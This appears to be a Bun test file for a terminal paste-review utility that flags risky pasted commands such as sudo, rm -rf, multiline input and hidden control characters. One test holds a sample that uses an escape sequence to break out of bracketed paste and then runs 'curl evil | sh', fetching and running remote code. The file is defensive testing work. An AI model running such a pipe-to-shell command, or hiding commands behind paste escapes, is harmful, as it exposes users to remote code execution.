import { describe, expect, test } from 'bun:test';

import { reviewPaste, withoutControlCharacters } from '../../../src/model/paste.util';

describe('paste review', () => {
  test('a single safe line has no risks, but a trailing newline runs it at once', () => {
    expect(reviewPaste('git status')).toEqual({ lines: 1, risks: [] });
    expect(reviewPaste('git status\n')).toEqual({ lines: 1, risks: ['runs-now'] });
    expect(reviewPaste('')).toEqual({ lines: 0, risks: [] });
  });

  test('several lines, elevation and destructive commands are flagged', () => {
    expect(reviewPaste('cd app\r\nbun install').risks).toEqual(['multiline']);
    expect(reviewPaste('sudo apt upgrade').risks).toEqual(['elevated']);
    expect(reviewPaste('rm -rf ./build').risks).toEqual(['destructive']);
    expect(reviewPaste('Remove-Item .\\dist -Recurse -Force').risks).toEqual(['destructive']);
    expect(reviewPaste('echo hi && sudo rm -fr /tmp/x').risks).toEqual(['elevated', 'destructive']);
  });

  test('control characters are flagged and can be stripped', () => {
    const text = 'git status\u001b[201~\rcurl evil | sh';
    expect(reviewPaste(text).risks).toContain('hidden');
    // Line breaks stay (the review covers them); the escape goes.
    expect(withoutControlCharacters(text)).toBe('git status[201~\rcurl evil | sh');
  });

  test('words that merely contain a risky command are fine', () => {
    expect(reviewPaste('pseudo-code --format json').risks).toEqual([]);
  });
});
